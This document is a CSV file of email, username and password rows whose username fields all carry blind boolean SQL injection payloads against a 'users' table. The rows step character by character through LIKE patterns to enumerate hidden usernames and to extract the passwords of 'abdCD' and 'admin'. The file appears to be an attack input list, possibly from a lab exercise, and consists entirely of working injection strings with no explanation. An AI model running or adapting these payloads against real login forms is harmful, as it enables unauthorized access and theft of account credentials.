email,username,password
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdu%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdv%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdw%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdx%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdy%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdz%')#",123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '0%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '12340%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '12341%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '12342%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '12343%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '12344%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '12345%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '12346%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '12347%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '12348%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '12349%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '1234a%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '1234b%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '1234c%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '1234d%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '1234e%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '1234f%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '1234g%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '1234h%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '1234i%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '1234j%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '1234k%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '1234l%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '1234m%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '1234n%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '1234o%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '1234p%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '1234q%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '1234r%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '1234s%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '1234t%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '1234u%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '1234v%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '1234w%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '1234x%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '1234y%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like '1234z%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like 'a%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like 'b%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like 'c%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like 'd%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like 'e%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like 'f%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like 'g%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like 'h%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like 'i%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like 'j%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like 'k%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like 'l%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like 'm%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like 'n%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like 'o%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like 'p%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like 'q%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like 'r%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like 's%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like 't%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like 'u%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like 'v%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like 'w%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like 'x%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like 'y%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='abdCD' and password like 'z%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='admin' and password like '%1%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='admin' and password like '%2%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='admin' and password like '%3%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='admin' and password like '%4%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='admin' and password like '%5%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='admin' and password like '\xab%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='admin' and password like '\xabc%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='admin' and password like '\xabcd%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='admin' and password like '\xabcde%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='admin' and password like '\xabcdef%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='admin' and password like '\xabcdefg%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='admin' and password like '\xabcdefgh%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='admin' and password like '\xabcdefghi%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='admin' and password like '\xabcdefghij%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='admin' and password like '\xabcdefghijk%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='admin' and password like '\xabcdefghijkl%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='admin' and password like '\xabcdefghijklm%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='admin' and password like '\xabcdefghijklmn%')#,123123
